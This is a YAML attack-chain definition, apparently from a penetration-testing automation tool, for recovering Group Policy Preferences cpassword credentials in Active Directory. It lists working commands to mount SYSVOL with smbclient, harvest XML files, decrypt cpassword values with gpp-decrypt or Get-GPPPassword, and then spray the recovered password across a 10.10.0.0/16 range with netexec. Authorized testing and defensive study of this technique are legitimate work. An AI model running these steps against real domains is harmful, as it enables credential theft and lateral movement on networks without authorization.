chain_id: gpp_cpassword_decrypt
title: "AD — Group Policy Preferences cpassword to plaintext"
severity: CRITICAL
tags: [ad, gpp, cpassword, sysvol, default-creds]

trigger:
  any_of:
    - { kind: "gpp-cpassword" }

description: |
  Group Policy Preferences (deprecated since 2014) stored credentials
  AES-encrypted with a key Microsoft published in MSDN. Any domain user
  can read SYSVOL — meaning any domain user can recover those passwords.
  Look in Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml,
  Printers.xml, Drives.xml.

steps:
  - id: 1
    title: "Mount SYSVOL anonymously / with the harvested cred"
    command: |
      smbclient //$DC/SYSVOL -N
      # Or with a credential:
      smbclient //$DC/SYSVOL -U $DOMAIN/USUARIO%PASSWORD

  - id: 2
    title: "Find every Groups.xml across SYSVOL"
    command: |
      # Inside smbclient:
      recurse ON; prompt OFF
      mget *.xml
      exit
      # In Bash:
      grep -rE 'cpassword="[^"]+"' .

  - id: 3
    title: "Decrypt with gpp-decrypt (Kali default)"
    command: gpp-decrypt 'BASE64_BLOB'

  - id: 4
    title: "Or with PowerShell from inside the domain"
    command: |
      Get-GPPPassword

  - id: 5
    title: "Spray the recovered credential — almost always reuses elsewhere"
    command: |
      # See chain credential_reuse for the full spray.
      netexec smb 10.10.0.0/16 -u USUARIO -p 'PASSWORD' --shares

references:
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/gpp-cpassword
